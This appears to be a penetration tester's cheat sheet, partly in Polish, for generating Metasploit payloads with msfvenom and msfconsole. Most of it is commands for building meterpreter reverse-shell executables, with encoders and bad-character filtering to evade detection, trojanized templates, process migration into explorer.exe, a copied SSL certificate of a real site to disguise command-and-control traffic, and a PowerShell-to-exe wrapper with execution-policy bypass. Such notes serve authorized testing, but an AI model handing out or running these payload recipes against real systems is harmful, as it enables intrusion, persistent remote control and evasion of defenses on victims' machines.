# $ msfvenom

https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html

**Tutorial:** https://www.hackingarticles.in/msfvenom-tutorials-beginners/
Ciekawe payloady: https://www.hackingarticles.in/fun-metasploit-payloads/

| msfvenom | what | msfvenom help |
| ---- | ---- | ---- |
| `-p ... LHOST=... LPORT=... ...`<br><br>automatyczna migracja do procesu<br>`prpendmigrateprocess=explorer.exe prependmigrate=true` | payloads | `msfvenom --list payloads`<br>`msfvenom --list-options -p ...` |
| `-f exe` | formats | `msfvenom --list formats` |
| `> file.exe`<br>`-o file.exe` | zapisz do pliku |  |
| `-e x86/shikata_ga_nai` <br>`-i 3` | encoders | `msfvenom --list encoders` |
| `-b '\x00\x0a\x0d\x20\xff'` | bad chars to avoid |  |
| `-x calc.exe` | custom template |  |
| `-k` | keep functionality of template |  |
| `--smallest` | generate smallest possible payload |  |


https://medium.com/@PenTest_duck/offensive-msfvenom-from-generating-shellcode-to-creating-trojans-4be10179bb86

## paylod z msfconsole

https://www.rapid7.com/blog/post/2020/12/23/metasploit-tips-and-tricks-for-haxmas-2020-2/#Skipping%20msfvenom's%20boot%20time

```bash
# omijanie msfvenom, generowanie payload z msfconsole
# Use the payload module:
use windows/meterpreter/reverse_https
set LHOST 127.0.0.1
set LPORT 4443
set SessionCommunicationTimeout 0
set ExitOnSession false

# Create the executable, as an alternative to msfvenom:
generate -o reverse_windows.exe -f exe

# Create a handler, as an alternative to exploit/multi/handler
to_handler / exploit -jq
```
## impersonate_ssl
request a copy of the remote SSL certyficate and creates a local (self signed) version using the information from the remote version.
```bash
$ msf> us egather/impersonate_ssl
$ msf> set rhost www.microsoft.com
$ msf> run
```
```bash
$ msf> use windows/x64/meterpreter/reverse_https
$ msf> set lhost ...
$ msf> set lport ...
$ msf> set handlersslcert </cert/path/cert.pem> # set SSL cert to use 
$ msf> set stagerverifysslcert true# TLS pinning
$ msf> generate -t exe -f ... # generate file within metasploit
$ msf> to_handler

```
## own shellcode in payload

```bash
$ cat binshellcode.bin | msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f c -b '\x00'
-p - instructs msfvenom to read the custom payload from the stdin
--platform win: is used to specify the platform
-e x86/shikata_ga_nai: specifies the encoder to use
-f c: sets the output format (in this case C)
```
## Convert a PowerShell script into an executable file
```bash
$ msfvenom -p windows/x64/exec CMD="powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File yourscript.ps1" -f exe -o outputfile.exe

```
